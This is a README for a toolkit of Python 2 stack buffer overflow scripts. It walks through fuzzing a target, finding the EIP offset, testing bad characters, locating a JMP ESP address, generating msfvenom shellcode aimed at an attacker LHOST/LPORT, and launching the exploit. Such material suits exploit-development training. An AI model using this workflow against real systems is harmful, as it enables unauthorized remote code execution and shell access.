# bof_scripts
Python2 scripts for Stack Buffer Overflows inspired by [dostackbufferoverflowgood](https://github.com/justinsteven/dostackbufferoverflowgood)

## Dependencies
1. msfvenom
2. python2
3. pattern_offset.rb
4. Immunity Debugger with Mona,py

## Usage

1. `git clone https://github.com/thirdbyte/bof_scripts`
2. `cd bof_scripts`
3. `chmod +x *`

### Initialization

1. Set `RHOST` and `RPORT` in `config.py` according to the target

### 1_fuzz.py

1. Modify `config.py` to have a working `connect` function
2. `./1_fuzz.py`
3. Update `BUFT` in `config.py` to be slightly larger than the crashed bytes.

### 2_find_offset.py

1. `./2_find_offset.py`
2. Copy the `EIP` address and find the `OFFSET` with `./pattern_offset.rb -q EIP_ADDRESS`

### 3_confirm_offset.py

1. Modify `OFFSET` of `config.py` to have the value found in the previous step
2. `./3_confirm_offset.py`
3. `ESP` should point to `CCCC`. If not, keep modifying `NO_B`, `NO_C` and `NO_Z` in `config.py`.

### 4_badchars.py

1. Modify `config.py` and make sure that initially, `BADCHARS=[0x00,0x0A]`
2. `./4_badchars.py`
3. Copy `bad.bin` generated to target machine
4. In debugger, right click on `ESP` and click `Follow in Dump`.
4. In debugger, execute `!mona compare -a esp -f c:\path\to\bad.bin`
5. Again modify `config.py` to add additional `BADCHARS`

### 5_jmp_esp.py

1. Find a suitable `\xff\xe4` address
2. Modify `JMPESP` in `config.py`
3. `./5_jmp_esp.py`
4. Observe debugger for `INT 3` in disassembler

### 6_shellcode.sh

1. `/6_shellcode.sh '<BADCHARS>' <LHOST> <LPORT>` where `BADCHARS` must be in form of `\x00\x0A..`

### 7_exploit.py 

1. `./7_exploit.py`
